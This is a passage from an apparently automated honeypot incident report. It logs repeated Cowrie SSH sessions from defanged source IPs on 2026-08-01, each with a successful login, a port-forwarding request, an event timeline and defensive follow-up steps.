| Field | Detail |
|---|---|
| **Source IP** | `112.194.142[.]167` |
| **First Seen** | 2026-08-01 05:21 |
| **Last Seen** | 2026-08-01 05:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:21:41` | `cowrie.session.connect` |
| `2026-08-01 05:21:42` | `cowrie.client.version` |
| `2026-08-01 05:21:42` | `cowrie.client.kex` |
| `2026-08-01 05:21:44` | `cowrie.login.success` |
| `2026-08-01 05:21:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.194.142[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.194.142[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50988b0f070

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-08-01 05:21 |
| **Last Seen** | 2026-08-01 05:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:21:55` | `cowrie.session.connect` |
| `2026-08-01 05:21:55` | `cowrie.client.version` |
| `2026-08-01 05:21:55` | `cowrie.client.kex` |
| `2026-08-01 05:21:57` | `cowrie.login.success` |
| `2026-08-01 05:21:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2dbba334937

| Field | Detail |
|---|---|
| **Source IP** | `122.170.100[.]253` |
| **First Seen** | 2026-08-01 05:22 |
| **Last Seen** | 2026-08-01 05:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:22:03` | `cowrie.session.connect` |
| `2026-08-01 05:22:04` | `cowrie.client.version` |
| `2026-08-01 05:22:04` | `cowrie.client.kex` |
| `2026-08-01 05:22:05` | `cowrie.login.success` |
| `2026-08-01 05:22:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.100[.]253` to AbuseIPDB if not already reported
- [ ] Block `122.170.100[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb7e8e42ce2

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-08-01 05:22 |
| **Last Seen** | 2026-08-01 05:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:22:17` | `cowrie.session.connect` |
| `2026-08-01 05:22:19` | `cowrie.client.version` |
| `2026-08-01 05:22:19` | `cowrie.client.kex` |
| `2026-08-01 05:22:25` | `cowrie.login.success` |
| `2026-08-01 05:22:25` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6986006ced0

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-08-01 05:22 |
| **Last Seen** | 2026-08-01 05:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:22:35` | `cowrie.session.connect` |
| `2026-08-01 05:22:35` | `cowrie.client.version` |
| `2026-08-01 05:22:35` | `cowrie.client.kex` |
| `2026-08-01 05:22:36` | `cowrie.login.success` |
| `2026-08-01 05:22:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8807a301595e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]46` |
| **First Seen** | 2026-08-01 05:23 |
| **Last Seen** | 2026-08-01 05:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:23:48` | `cowrie.session.connect` |
| `2026-08-01 05:23:48` | `cowrie.client.version` |
| `2026-08-01 05:23:48` | `cowrie.client.kex` |
| `2026-08-01 05:23:49` | `cowrie.login.success` |
| `2026-08-01 05:23:50` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]46` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078c91c174a9

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-08-01 05:23 |
| **Last Seen** | 2026-08-01 05:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:23:54` | `cowrie.session.connect` |
| `2026-08-01 05:23:55` | `cowrie.client.version` |
| `2026-08-01 05:23:55` | `cowrie.client.kex` |
| `2026-08-01 05:23:55` | `cowrie.login.success` |
| `2026-08-01 05:23:56` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf4f1a7c741

| Field | Detail |
|---|---|
| **Source IP** | `183.247.171[.]186` |
| **First Seen** | 2026-08-01 05:25 |
| **Last Seen** | 2026-08-01 05:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:25:44` | `cowrie.session.connect` |
| `2026-08-01 05:25:45` | `cowrie.client.version` |
| `2026-08-01 05:25:45` | `cowrie.client.kex` |
| `2026-08-01 05:25:47` | `cowrie.login.success` |
| `2026-08-01 05:25:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.247.171[.]186` to AbuseIPDB if not already reported
- [ ] Block `183.247.171[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45be1d4e204a

| Field | Detail |
|---|---|
| **Source IP** | `101.13.9[.]48` |
| **First Seen** | 2026-08-01 05:25 |
| **Last Seen** | 2026-08-01 05:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:25:54` | `cowrie.session.connect` |
| `2026-08-01 05:25:55` | `cowrie.client.version` |
| `2026-08-01 05:25:55` | `cowrie.client.kex` |
| `2026-08-01 05:25:56` | `cowrie.login.success` |
| `2026-08-01 05:25:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.9[.]48` to AbuseIPDB if not already reported
- [ ] Block `101.13.9[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220f01b67d53

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-08-01 05:26 |
| **Last Seen** | 2026-08-01 05:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:26:02` | `cowrie.session.connect` |
| `2026-08-01 05:26:02` | `cowrie.client.version` |
| `2026-08-01 05:26:02` | `cowrie.client.kex` |
| `2026-08-01 05:26:03` | `cowrie.login.success` |
| `2026-08-01 05:26:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65d388be7ba

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-08-01 05:26 |
| **Last Seen** | 2026-08-01 05:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:26:50` | `cowrie.session.connect` |
| `2026-08-01 05:26:50` | `cowrie.client.version` |
| `2026-08-01 05:26:50` | `cowrie.client.kex` |
| `2026-08-01 05:26:53` | `cowrie.login.success` |
| `2026-08-01 05:26:53` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0792ca63b898

| Field | Detail |
|---|---|
| **Source IP** | `116.48.138[.]69` |
| **First Seen** | 2026-08-01 05:26 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:26:59` | `cowrie.session.connect` |
| `2026-08-01 05:27:00` | `cowrie.client.version` |
| `2026-08-01 05:27:00` | `cowrie.client.kex` |
| `2026-08-01 05:27:01` | `cowrie.login.success` |
| `2026-08-01 05:27:02` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.138[.]69` to AbuseIPDB if not already reported
- [ ] Block `116.48.138[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed559e2976b0

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-08-01 05:26 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:26:59` | `cowrie.session.connect` |
| `2026-08-01 05:27:00` | `cowrie.client.version` |
| `2026-08-01 05:27:00` | `cowrie.client.kex` |
| `2026-08-01 05:27:02` | `cowrie.login.success` |
| `2026-08-01 05:27:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052c046370bb

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-08-01 05:27 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:27:08` | `cowrie.session.connect` |
| `2026-08-01 05:27:09` | `cowrie.client.version` |
| `2026-08-01 05:27:09` | `cowrie.client.kex` |
| `2026-08-01 05:27:11` | `cowrie.login.success` |
| `2026-08-01 05:27:11` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1348a8807cee

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]191` |
| **First Seen** | 2026-08-01 05:27 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:27:18` | `cowrie.session.connect` |
| `2026-08-01 05:27:18` | `cowrie.client.version` |
| `2026-08-01 05:27:18` | `cowrie.client.kex` |
| `2026-08-01 05:27:19` | `cowrie.login.success` |
| `2026-08-01 05:27:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]191` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e29e8d720b

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-08-01 05:27 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:27:22` | `cowrie.session.connect` |
| `2026-08-01 05:27:22` | `cowrie.client.version` |
| `2026-08-01 05:27:22` | `cowrie.client.kex` |
| `2026-08-01 05:27:24` | `cowrie.login.success` |
| `2026-08-01 05:27:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be953036672e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-08-01 05:27 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:27:25` | `cowrie.session.connect` |
| `2026-08-01 05:27:25` | `cowrie.client.version` |
| `2026-08-01 05:27:25` | `cowrie.client.kex` |
| `2026-08-01 05:27:26` | `cowrie.login.success` |
| `2026-08-01 05:27:27` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93304fcdab26

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-08-01 05:27 |
| **Last Seen** | 2026-08-01 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:27:29` | `cowrie.session.connect` |
| `2026-08-01 05:27:29` | `cowrie.client.version` |
| `2026-08-01 05:27:29` | `cowrie.client.kex` |
| `2026-08-01 05:27:31` | `cowrie.login.success` |
| `2026-08-01 05:27:31` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381dce17d5cb

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-08-01 05:28 |
| **Last Seen** | 2026-08-01 05:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:28:02` | `cowrie.session.connect` |
| `2026-08-01 05:28:02` | `cowrie.client.version` |
| `2026-08-01 05:28:02` | `cowrie.client.kex` |
| `2026-08-01 05:28:03` | `cowrie.login.success` |
| `2026-08-01 05:28:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b363877dde68

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-01 05:28 |
| **Last Seen** | 2026-08-01 05:33 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:28:08` | `cowrie.session.connect` |
| `2026-08-01 05:28:09` | `cowrie.client.version` |
| `2026-08-01 05:28:09` | `cowrie.client.kex` |
| `2026-08-01 05:28:11` | `cowrie.login.success` |
| `2026-08-01 05:28:11` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c39bbe213a6

| Field | Detail |
|---|---|
| **Source IP** | `109.206.102[.]75` |
| **First Seen** | 2026-08-01 05:29 |
| **Last Seen** | 2026-08-01 05:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:29:14` | `cowrie.session.connect` |
| `2026-08-01 05:29:14` | `cowrie.client.version` |
| `2026-08-01 05:29:14` | `cowrie.client.kex` |
| `2026-08-01 05:29:15` | `cowrie.login.success` |
| `2026-08-01 05:29:15` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.206.102[.]75` to AbuseIPDB if not already reported
- [ ] Block `109.206.102[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f6643083d7

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-08-01 05:29 |
| **Last Seen** | 2026-08-01 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:29:25` | `cowrie.session.connect` |
| `2026-08-01 05:29:25` | `cowrie.client.version` |
| `2026-08-01 05:29:25` | `cowrie.client.kex` |
| `2026-08-01 05:29:27` | `cowrie.login.success` |
| `2026-08-01 05:29:27` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922d154f02c7

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-08-01 05:29 |
| **Last Seen** | 2026-08-01 05:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:29:35` | `cowrie.session.connect` |
| `2026-08-01 05:29:36` | `cowrie.client.version` |
| `2026-08-01 05:29:36` | `cowrie.client.kex` |
| `2026-08-01 05:29:38` | `cowrie.login.success` |
| `2026-08-01 05:29:38` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e26a3698d06

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-08-01 05:29 |
| **Last Seen** | 2026-08-01 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:29:46` | `cowrie.session.connect` |
| `2026-08-01 05:29:47` | `cowrie.client.version` |
| `2026-08-01 05:29:47` | `cowrie.client.kex` |
| `2026-08-01 05:29:48` | `cowrie.login.success` |
| `2026-08-01 05:29:49` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d16b847b1ef

| Field | Detail |
|---|---|
| **Source IP** | `183.89.248[.]224` |
| **First Seen** | 2026-08-01 05:30 |
| **Last Seen** | 2026-08-01 05:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:30:06` | `cowrie.session.connect` |
| `2026-08-01 05:30:07` | `cowrie.client.version` |
| `2026-08-01 05:30:07` | `cowrie.client.kex` |
| `2026-08-01 05:30:09` | `cowrie.login.success` |
| `2026-08-01 05:30:09` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.248[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.89.248[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53398a6c3ed6

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-08-01 05:30 |
| **Last Seen** | 2026-08-01 05:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:30:46` | `cowrie.session.connect` |
| `2026-08-01 05:30:48` | `cowrie.client.version` |
